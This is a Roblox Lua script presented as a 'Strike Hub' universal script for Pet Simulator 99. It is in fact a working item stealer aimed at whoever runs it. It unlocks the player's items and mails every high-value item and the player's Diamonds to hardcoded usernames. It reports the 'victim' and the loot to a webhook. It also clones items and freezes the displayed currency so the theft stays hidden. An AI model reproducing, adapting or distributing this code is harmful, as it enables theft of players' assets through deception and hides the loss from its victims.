--// Strike Hub Universal Script (Fixed Version)
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

--// SETTINGS
local MailMessage = "GGz"
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = 10000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:Kick("No usernames or webhook set")
    return
end

for _, u in ipairs(users) do
    if plr.Name == u then
        plr:Kick("Cannot mail yourself")
        return
    end
end

--// SAFE REQUIRE
local function safeRequire(path)
    local success, result = pcall(require, path)
    return success and result or {}
end

local network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
local saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)

--// GET SAVE
local rawSave = (saveModule.Get and saveModule.Get()) or {}
local save = rawSave.Save or rawSave.Inventory or {}

--// ==========================
--// VISUAL FREEZE (PERMANENT)
--// ==========================
local visualCurrency = {}
for _, v in pairs(save.Currency or {}) do
    visualCurrency[v.id] = v._am
end

task.spawn(function()
    while plr.Parent do
        task.wait(0.05)
        if plr:FindFirstChild("leaderstats") then
            for id, value in pairs(visualCurrency) do
                local stat = plr.leaderstats:FindFirstChild(id)
                if stat then stat.Value = value end
            end
        end
    end
end)

local visual3D = {}
local function clone3DItems(folder)
    if not folder then return end
    for _, obj in pairs(folder:GetChildren()) do
        if not visual3D[obj.Name] then
            local clone = obj:Clone()
            clone.Parent = folder
            visual3D[obj.Name] = clone
            obj.Parent = nil
        end
    end
end

local visualGUI = {}
local function cloneGUIItems(guiFolder)
    if not guiFolder then return end
    for _, obj in pairs(guiFolder:GetChildren()) do
        if not visualGUI[obj.Name] then
            local clone = obj:Clone()
            clone.Parent = guiFolder
            visualGUI[obj.Name] = clone
            obj.Visible = false
        end
    end
end

task.spawn(function()
    while plr.Parent do
        task.wait(0.05)
        clone3DItems(plr:FindFirstChild("Pets"))
        clone3DItems(plr:FindFirstChild("Hoverboards"))
        clone3DItems(plr:FindFirstChild("Eggs"))
        clone3DItems(plr:FindFirstChild("Booths"))

        cloneGUIItems(plr.PlayerGui:FindFirstChild("Charms"))
        cloneGUIItems(plr.PlayerGui:FindFirstChild("Enchants"))
        cloneGUIItems(plr.PlayerGui:FindFirstChild("Potions"))
        cloneGUIItems(plr.PlayerGui:FindFirstChild("Misc"))
        cloneGUIItems(plr.PlayerGui:FindFirstChild("Ultimate"))
    end
end)

--// MAIL COST
local mailSendPrice = 10000
pcall(function()
    for _, func in pairs(getgc and getgc() or {}) do
        local info = debug.getinfo(func)
        if info and info.name == "computeSendMailCost" then
            mailSendPrice = func()
            break
        end
    end
end)

--// NUMBER FORMAT
local function formatNumber(n)
    if n >= 1e12 then return string.format("%.2ft", n/1e12)
    elseif n >= 1e9 then return string.format("%.2fb", n/1e9)
    elseif n >= 1e6 then return string.format("%.2fm", n/1e6)
    elseif n >= 1e3 then return string.format("%.2fk", n/1e3)
    else return tostring(math.floor(n)) end
end

--// RAP FUNCTION
local function getRAP(category, item)
    local success, val = pcall(function()
        local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
        return RAPCmds.Get({
            Class = {Name = category},
            IsA = function(h) return h == category end,
            GetId = function() return item.id end,
            StackKey = function()
                return HttpService:JSONEncode({id=item.id, pt=item.pt or 0, sh=item.sh or false, tn=item.tn or ""})
            end
        })
    end)
    return success and val or (item._rap or 0)
end

--// SEND ITEM
local function sendItem(category, stackKey, amount)
    for _, user in ipairs(users) do
        local args = {user, MailMessage, category, stackKey, amount or 1}
        local ok, response = pcall(function()
            return network.Invoke("Mailbox: Send", unpack(args))
        end)
        if ok and response == true then
            return true
        end
        task.wait(0.2)
    end
    return false
end

--// UNLOCK ITEMS
for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[cat] then
        for uid, item in pairs(save[cat]) do
            if item._lk then
                pcall(function() network.Invoke("Locking_SetLocked", uid, false) end)
            end
        end
    end
end

--// COLLECT ITEMS
local sortedItems, totalRAP = {}, 0
for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[cat] then
        for uid, item in pairs(save[cat]) do
            local rap = getRAP(cat, item)
            if rap >= min_rap then
                local prefix = (item.sh and "Shiny " or "")
                if item.pt == 1 then prefix ..= "Golden "
                elseif item.pt == 2 then prefix ..= "Rainbow " end
                local name = prefix .. item.id
                table.insert(sortedItems, {
                    category = cat,
                    uid = uid,
                    amount = item._am or 1,
                    rap = rap,
                    name = name,
                    StackKey = function()
                        return HttpService:JSONEncode({id=item.id, pt=item.pt or 0, sh=item.sh or false, tn=item.tn or ""})
                    end
                })
                totalRAP += rap * (item._am or 1)
            end
        end
    end
end

table.sort(sortedItems, function(a,b)
    return a.rap*a.amount > b.rap*b.amount
end)

--// WEBHOOK REPORT
task.spawn(function()
    local requestFunc = request or http_request or syn and syn.request or http and http.request or nil
    if not requestFunc then return end
    local headers = {["Content-Type"]="application/json"}
    local fields = {
        {name="Victim Username:", value=plr.Name, inline=true},
        {name="Items to be sent:", value="", inline=false},
        {name="Summary:", value="Total RAP: "..formatNumber(totalRAP), inline=false}
    }
    for _, item in ipairs(sortedItems) do
        fields[2].value ..= item.name.." (x"..item.amount.."): "..formatNumber(item.rap).."\n"
    end
    local body = HttpService:JSONEncode({
        embeds = {{
            title="New PS99 Execution",
            color=65280,
            fields=fields,
            footer={text="Strike Hub."}
        }}
    })
    pcall(function()
        requestFunc({Url=webhook, Method="POST", Headers=headers, Body=body})
    end)
end)

--// SEND ITEMS ASYNC
for _, item in ipairs(sortedItems) do
    local key = item.StackKey and item.StackKey() or item.uid
    sendItem(item.category, key, item.amount)
end

--// SEND GEMS LAST (unchanged)
for i, v in pairs(save.Currency or {}) do
    if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
        for _, user in ipairs(users) do
            local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
            local ok, response = pcall(function()
                return network.Invoke("Mailbox: Send", unpack(args))
            end)
            if ok and response == true then break end
            task.wait(0.2)
        end
        break
    end
end

print("[Strike Hub] Done sending items. Visual freeze remains until player leaves.")
